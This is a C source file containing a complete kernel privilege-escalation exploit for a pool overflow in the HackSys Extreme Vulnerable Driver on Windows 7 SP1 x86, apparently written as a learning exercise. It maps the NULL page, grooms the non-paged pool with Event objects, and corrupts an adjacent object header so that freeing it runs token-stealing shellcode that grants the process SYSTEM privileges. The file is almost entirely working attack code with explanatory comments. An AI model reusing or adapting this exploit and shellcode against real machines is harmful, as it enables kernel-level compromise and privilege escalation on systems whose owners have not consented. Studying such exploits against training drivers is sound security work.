#include "stdafx.h"
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

//From http://stackoverflow.com/a/26414236 this defines the details of the NtAllocateVirtualMemory function
//which we will use to map the NULL page in user space.
typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID        0x004    // SYSTEM Process PID
//Standard token stealing shellcode - see https://samdb.xyz/windows-kernel-exploitation-part-2-my-first-kernel-exploit/ for more details
//With added ret 4, as the function pointer we overwrite expects a 4 byte argument we need to remove from the stack.
__declspec(naked) VOID TokenStealingShellcodeWin7Generic() {
	__asm {
		; initialize
		pushad; save registers state

		xor eax, eax; Set zero
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current _EPROCESS structure

		mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4

	SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
		sub eax, FLINK_OFFSET
		cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
		jne SearchSystemPID
			
		mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
		mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM to current process
		popad; restore registers state
		ret 4;
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD lpBytesReturned;
	LPCSTR lpDeviceName = (LPCSTR) "\\\\.\\HackSysExtremeVulnerableDriver";

	printf("Getting the device handle\r\n");
	//HANDLE WINAPI CreateFile( _In_ lpFileName, _In_ dwDesiredAccess, _In_ dwShareMode, _In_opt_ lpSecurityAttributes,
	//_In_ dwCreationDisposition, _In_ dwFlagsAndAttributes, _In_opt_ hTemplateFile );
	HANDLE hDriver = CreateFile(lpDeviceName,			//File name - in this case our device name
		GENERIC_READ | GENERIC_WRITE,					//dwDesiredAccess - type of access to the file, can be read, write, both or neither. We want read and write because thats the permission the driver declares we need.
		FILE_SHARE_READ | FILE_SHARE_WRITE,				//dwShareMode - other processes can read and write to the driver while we're using it but not delete it - FILE_SHARE_DELETE would enable this.
		NULL,											//lpSecurityAttributes - Optional, security descriptor for the returned handle and declares whether inheriting processes can access it - unneeded for us.
		OPEN_EXISTING,									//dwCreationDisposition - what to do if the file/device doesn't exist, in this case only opens it if it already exists, returning an error if it doesn't.
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,	//dwFlagsAndAttributes - In this case the FILE_ATTRIBUTE_NORMAL means that the device has no special file attributes and FILE_FLAG_OVERLAPPED means that the device is being opened for async IO.
		NULL);											//hTemplateFile - Optional, only used when creating a new file - takes a handle to a template file which defineds various attributes for the file being created.

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to get device handle :( 0x%X\r\n", GetLastError());
		return 1;
	}
	printf("Got the device Handle: 0x%X\r\n", hDriver);

	//We don't use the allocated NULL page for a while but allocating memory after attempting to do some
	//precision Pool manipulations seems like a bad idea.

	HMODULE hNtdll = GetModuleHandle("ntdll.dll");

	if (hNtdll == INVALID_HANDLE_VALUE) {
		printf("Could not open handle to ntdll. \n");
		CloseHandle(hDriver);
		return 1;
	}

	//Get address of NtAllocateVirtualMemory from the dynamically linked library and then cast it to a callable function type
	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");;

	if (!NtAllocateVirtualMemory) {
		printf("Failed Resolving NtAllocateVirtualMemory: 0x%X\n", GetLastError());
		return 1;
	}

	//We can't outright pass NULL as the address but if we pass 1 then it gets rounded down to 0...
	PVOID baseAddress = (PVOID)0x1;
	SIZE_T regionSize = 0x2000; //Probably enough, it will get rounded up to the next page size
								// Map the null page
	NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(), //Current process handle
		&baseAddress, //address we want our memory to start at, will get rounded down to the nearest page boundary
		0, //The number of high-order address bits that must be zero in the base address of the section view. Not a clue here
		&regionSize, //Required size - will be modified to actual size allocated, is rounded up to the next page boundary
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, //claim memory straight away, get highest appropriate address
		PAGE_EXECUTE_READWRITE //All permissions
	);

	if (ntStatus != 0) {
		printf("Virtual Memory Allocation Failed: 0x%x\n", ntStatus);
		return 1;
	}

	printf("Address allocated at: 0x%p\n", baseAddress);
	printf("Allocated memory size: 0x%X\n", regionSize);

	HANDLE hDefragEvents[0x2000] = { 0x00 };
	HANDLE hPoolGroomEvents[0x2000] = { 0x00 };

	//Allocating these Events will cause any 0x200 byte holes early in the address space to definitly be filled
	//This ensures the next group of allocations are all contiguous
	for (unsigned int i = 0; i < 0x2000; i++) {
		HANDLE hEvent = CreateEvent(NULL, false, false, NULL);
		if (hEvent == NULL) {
			printf("Failed to create defrag event 0x%X: 0x%X\r\n", i, GetLastError());
			return 1;
		}
		hDefragEvents[i] = hEvent;
	}

	printf("Pool defrag'd\r\n");
	//These Event objects should all be allocated one after the other
	for (unsigned int i = 0; i < 0x2000; i++) {
		HANDLE hEvent = CreateEvent(NULL, false, false, NULL);
		if (hEvent == NULL) {
			printf("Failed to create groom event 0x%X: 0x%X\r\n", i, GetLastError());
			return 1;
		}
		hPoolGroomEvents[i] = hEvent;
	}

	printf("Grooming phase 1 complete - contiguous events allocated.\r\n");
	//Working on the assumption the allocated events were successfully allocated contigously
	//Free groups of 8 consecutive events should lead a pattern of 8 free events objects followed by 8 allocated ones
	//This ensures the 0x1f8 bugger (+ 8 byte header) allocated by the driver should have an Event object directly after it
	for (unsigned int i = 0; i < 0x2000; i += 0x10) {
		for (unsigned int j = 0; j < 8; j++) {
			HANDLE hEvent = hPoolGroomEvents[i + j];
			if (!CloseHandle(hEvent)) {
				printf("Failed to punch hole with event object 0x%X: 0x%X\r\n", hEvent, GetLastError());
				return 1;
			}
		}
	}

	printf("Grooming complete - pool full o'holes\r\n");

	//The first 0x1F8 bytes fill the allocation created by the driver and are just set to be 0x41, 
	//the further 0x28 bytes are used to overwrite the layout of the adjacent Event object
	size_t nInBufferSize = 0x1F8 + 0x28;
	PULONG lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);

	if (!lpInBuffer) {
		printf("HeapAlloc failed :( 0x%X\r\n", GetLastError());
		return 1;
	}

	printf("Input buffer allocated as 0x%X bytes.\r\n", nInBufferSize);
	printf("Input buffer address: 0x%p\r\n", lpInBuffer);

	printf("Filling buffer.\r\n");

	//OBJECT_TYPE structure starting at 0x0, by writing our shellcode pointer at 0x64 it will called as if it's the pool objects DeleteProcedure function
	//As seen below this a complex structure but if all we do with the target object is free it, we can avoid any of the data being referenced.
	//dt -r 2 nt!_OBJECT_TYPE
	//  +0x000 TypeList         : _LIST_ENTRY
	//	+ 0x000 Flink : ? ? ? ?
	//	+0x004 Blink : ? ? ? ?
	//	+0x008 Name : _UNICODE_STRING
	//	+ 0x000 Length : ? ?
	//	+0x002 MaximumLength : ? ?
	//	+0x004 Buffer : ? ? ? ?
	//	+0x010 DefaultObject : ? ? ? ?
	//	+0x014 Index : ? ?
	//	+0x018 TotalNumberOfObjects : ? ?
	//	+0x01c TotalNumberOfHandles : ? ?
	//	+0x020 HighWaterNumberOfObjects : ? ?
	//	+0x024 HighWaterNumberOfHandles : ? ?
	//	+0x028 TypeInfo : _OBJECT_TYPE_INITIALIZER
	//	+ 0x000 Length : ? ?
	//	+0x002 ObjectTypeFlags : ? ?
	//	+0x002 CaseInsensitive : ? ?
	//	+0x002 UnnamedObjectsOnly : ? ?
	//	+0x002 UseDefaultObject : ? ?
	//	+0x002 SecurityRequired : ? ?
	//	+0x002 MaintainHandleCount : ? ?
	//	+0x002 MaintainTypeList : ? ?
	//	+0x002 SupportsObjectCallbacks : ? ?
	//	+0x002 CacheAligned : ? ?
	//	+0x004 ObjectTypeCode : ? ?
	//	+0x008 InvalidAttributes : ? ?
	//	+0x00c GenericMapping : _GENERIC_MAPPING
	//	+ 0x000 GenericRead : ? ?
	//	+0x004 GenericWrite : ? ?
	//	+0x008 GenericExecute : ? ?
	//	+0x00c GenericAll : ? ?
	//	+0x01c ValidAccessMask : ? ?
	//	+0x020 RetainAccess : ? ?
	//	+0x024 PoolType : ? ?
	//	+0x028 DefaultPagedPoolCharge : ? ?
	//	+0x02c DefaultNonPagedPoolCharge : ? ?
	//	+0x030 DumpProcedure : ? ? ? ? //0x58
	//	+0x034 OpenProcedure : ? ? ? ? //0x5C
	//	+0x038 CloseProcedure : ? ? ? ? //0x60
	//	+0x03c DeleteProcedure : ? ? ? ? //0x64
	//	+0x040 ParseProcedure : ? ? ? ? //0x68
	//	+0x044 SecurityProcedure : ? ? ? ? //0x6c
	//	+0x048 QueryNameProcedure : ? ? ? ? //0x70
	//	+0x04c OkayToCloseProcedure : ? ? ? ? //0x74
	//	+0x078 TypeLock : _EX_PUSH_LOCK
	//	+ 0x000 Locked : ? ?
	//	+0x000 Waiting : ? ?
	//	+0x000 Waking : ? ?
	//	+0x000 MultipleShared : ? ?
	//	+0x000 Shared : ? ?
	//	+0x000 Value : ? ?
	//	+0x000 Ptr : ? ? ? ?
	//	+0x07c Key : ? ?
	//	+0x080 CallbackList : _LIST_ENTRY
	//	+ 0x000 Flink : ? ? ? ?
	//	+0x004 Blink : ? ? ? ?
	//Overwrite DeleteProcedure for a token as the other examples I found use other Procedure overwrites....
	*(PULONG)0x64 = (ULONG) &TokenStealingShellcodeWin7Generic; 

	memset(lpInBuffer, 0x41, nInBufferSize);
	//The last 0x28 bytes of the input buffer overwrite the adjacent Event object
	//The indexes / 4 are used to show the byte offset into the overwrite while making assigning 32 bit values easy

	//First of all we overwrite the POOL_HEADER structure, we aren't modifying any of the values here
	//They're just being set to what they should be on any of the Events we allocated for Pool grooming.
 	//For more details http://www.codemachine.com/article_kernelstruct.html#POOL_HEADER & http://codemachine.com/article_objectheader.html
	//In summary it consists of meta data used by the pool allocated, debugging tools, etc
	lpInBuffer[0x1F8 / 4] = 0x04080040;
	//dt nt!_POOL_HEADER  
	//  + 0x000 PreviousSize : Pos 0, 9 Bits  => 0x40  
	//	+ 0x000 PoolIndex : Pos 9, 7 Bits => 0x0
	//	+ 0x002 BlockSize Pos 0, 9 Bits => 0x40
	//	+ 0x002 PoolType : Pos 9, 7 Bits => 0x2 (Non-Paged Pool)
	//	+ 0x000 Ulong1 : Uint4B => 0x04080040 (Just a union field)
	lpInBuffer[0x1FC / 4] = 0xee657645;
	//	+ 0x004 PoolTag : Uint4B=> 0xee657645 => 'Even'
	//	+ 0x004 AllocatorBackTraceIndex : Uint2B => 0x7645
	//	+ 0x006 PoolTagHash : Uint2B => 0xee65

	//Second we overwrite the OBJECT_HEADER_QUOTA_INFO structure
	//Contains resource usage information for the object, here it's just set the default for an Event object
	//Which is 0x40 bytes of Non-paged pool memory and none of anything else, as it's a 0x40 byte allocation in the Non-paged pool...
	lpInBuffer[0x200 / 4] = 0x00000000;
	// dt nt!_OBJECT_HEADER_QUOTA_INFO
	//	+ 0x000 PagedPoolCharge  : Uint4B
	lpInBuffer[0x204 / 4] = 0x00000040;
	//  + 0x004 NonPagedPoolCharge : Uint4B	
	lpInBuffer[0x208 / 4] = 0x00000000;
	//  + 0x008 SecurityDescriptorCharge : Uint4B
	lpInBuffer[0x20C / 4] = 0x00000000;
	//  + 0x00c SecurityDescriptorQuotaBlock : Ptr32 Void

	//Finally we overwrite the OBJECT_HEADER structure
	//This provides meta data and procedures pointers to keep track of and manage the Object itself
	lpInBuffer[0x210 / 4] = 0x00000001;
	//dt nt!_OBJECT_HEADER
	//	+ 0x000 PointerCount     : Int4B => 1, one active pointer to the object
	lpInBuffer[0x214 / 4] = 0x00000001;
	//  + 0x004 HandleCount : Int4B => 1, one active handle to the object
	//	+ 0x004 NextToFree : Ptr32 Void => Unused on an allocated object
	lpInBuffer[0x218 / 4] = 0x00000000;
	//  + 0x008 Lock : _EX_PUSH_LOCK => NULL, 
	//Interesting note from codemachine: On older version of Windows, the object manager attempted to acquire an object type specific lock (OBJECT_TYPE->TypeLock) before performing an operation on an object. This implied that no other object of that type in the entire system could be manipulated for the duration the object type lock was held.
	lpInBuffer[0x21C / 4] = 0x00080000;
	//  + 0x00c TypeIndex : UChar => 0x00 - This is the only field we corrupt, normally for an event object on Win7SP1 this would be 0xC
	//	+ 0x00d TraceFlags : UChar => 0x00
	//	+ 0x00e InfoMask : UChar => 0x08
	//	+ 0x00f Flags : UChar => 0x00

	//We only wanted to modify the TypeIndex field above so stop overwriting before completely overwriting the structure, for completions sake it's fields are:
	//  + 0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION
	//	+ 0x010 QuotaBlockCharged : Ptr32 Void
	//	+ 0x014 SecurityDescriptor : Ptr32 Void
	//	+ 0x018 Body : _QUAD

	DeviceIoControl(hDriver,
		HACKSYS_EVD_IOCTL_POOL_OVERFLOW,
		lpInBuffer,
		nInBufferSize,
		NULL,
		0,
		&lpBytesReturned,
		NULL);
	printf("Overflow triggered\r\n");


	//With the overflow complete attempting to free the corrupted Event object will cause ___ to be called, for the corrupted object
	//it will try to to find the function pointer by looking at an offset of ___ from NULL, causing it execute the shellcode
	for (unsigned int i = 0; i < 0x2000; i++) {
		HANDLE hEvent = hDefragEvents[i];
		if (!CloseHandle(hEvent)) {
			printf("Failed to remove defrag event object 0x%X: 0x%X\r\n", hEvent, GetLastError());
			return 1;
		}
	}

	printf("All defrag objects free'd\r\n");
	for (unsigned int i = 8; i < 0x2000; i += 0x10) {
		for (unsigned int j = 0; j < 8; j++) {
			HANDLE hEvent = hPoolGroomEvents[i + j];
			if (!CloseHandle(hEvent)) {
				printf("Failed to remove pool groom event object 0x%X: 0x%X\r\n", hEvent, GetLastError());
				return 1;
			}
		}
	}

	printf("Bug triggered - all event's free'd.\r\n");
	//With the shellcode executed we should now have a security token which gives us SYSTEM level privileges
	
	system("calc.exe");

	printf("Exploit complete, tidying up.\r\n");
	HeapFree(GetProcessHeap(), 0, lpInBuffer);
	CloseHandle(hDriver);
	return 0;
}
